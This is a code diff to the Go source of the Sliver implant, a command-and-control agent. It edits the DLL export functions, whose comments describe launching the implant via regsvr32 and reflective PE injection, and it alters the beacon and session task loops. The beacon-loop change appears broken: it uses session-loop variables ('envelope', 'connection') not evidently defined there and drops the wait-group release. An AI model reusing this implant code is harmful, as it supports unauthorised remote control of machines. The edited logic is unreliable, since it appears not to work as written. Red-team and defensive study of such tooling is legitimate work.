@@ -51,8 +51,8 @@ import (
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
-	"github.com/bishopfox/sliver/implant/sliver/locale"
 	"github.com/bishopfox/sliver/implant/sliver/limits"
+	"github.com/bishopfox/sliver/implant/sliver/locale"
 	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/implant/sliver/version"
@@ -127,6 +127,7 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 var isRunning bool = false
 
 // StartW - Export for shared lib build
+//
 //export StartW
 func StartW() {
 	if !isRunning {
@@ -139,21 +140,25 @@ func StartW() {
 //https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65
 
 // VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
+//
 //export VoidFunc
 func VoidFunc() { main() }
 
 // DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
+//
 //export DllInstall
 func DllInstall() { main() }
 
 // DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
+//
 //export DllRegisterServer
 func DllRegisterServer() { main() }
 
 // DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
+//
 //export DllUnregisterServer
 func DllUnregisterServer() { main() }
 
@@ -409,20 +414,16 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 			wg.Add(1)
 			data := task.Data
 			taskID := task.ID
-			go handler(data, func(data []byte, err error) {
-				resultsMutex.Lock()
-				defer resultsMutex.Unlock()
-				defer wg.Done()
-				// {{if .Config.Debug}}
+			go handlers.WrapperHandler(handler, envelope.Data, func(data []byte, err error) {
 				if err != nil {
-					log.Printf("[beacon] handler function returned an error: %s", err)
+					// {{if .Config.Debug}}
+					log.Printf("[session] handler function returned an error: %s", err)
+					// {{end}}
 				}
-				log.Printf("[beacon] task completed (id: %d)", taskID)
-				// {{end}}
-				results = append(results, &sliverpb.Envelope{
-					ID:   taskID,
+				connection.Send <- &sliverpb.Envelope{
+					ID:   envelope.ID,
 					Data: data,
-				})
+				}
 			})
 		} else if task.Type == sliverpb.MsgOpenSession {
 			go openSessionHandler(task.Data)
@@ -567,25 +568,25 @@ func sessionMainLoop(connection *transports.Connection) error {
 			// It's fucking gross to do that here, but I could not come with a better solution.
 
 			// {{if eq .Config.GOOS "windows" }}
-			if priv.CurrentToken != 0 {
-				err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
-				if err != nil {
-					// {{if .Config.Debug}}
-					log.Printf("Error: %v\n", err)
-					// {{end}}
-				}
-			}
+			// if priv.CurrentToken != 0 {
+			// 	err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
+			// 	if err != nil {
+			// 		// {{if .Config.Debug}}
+			// 		log.Printf("Error: %v\n", err)
+			// 		// {{end}}
+			// 	}
+			// }
 			// {{end}}
 
 			// {{if .Config.Debug}}
 			log.Printf("[recv] sysHandler %d", envelope.Type)
 			// {{end}}
-			go handler(envelope.Data, func(data []byte, err error) {
-				// {{if .Config.Debug}}
+			go handlers.WrapperHandler(handler, envelope.Data, func(data []byte, err error) {
 				if err != nil {
+					// {{if .Config.Debug}}
 					log.Printf("[session] handler function returned an error: %s", err)
+					// {{end}}
 				}
-				// {{end}}
 				connection.Send <- &sliverpb.Envelope{
 					ID:   envelope.ID,
 					Data: data,
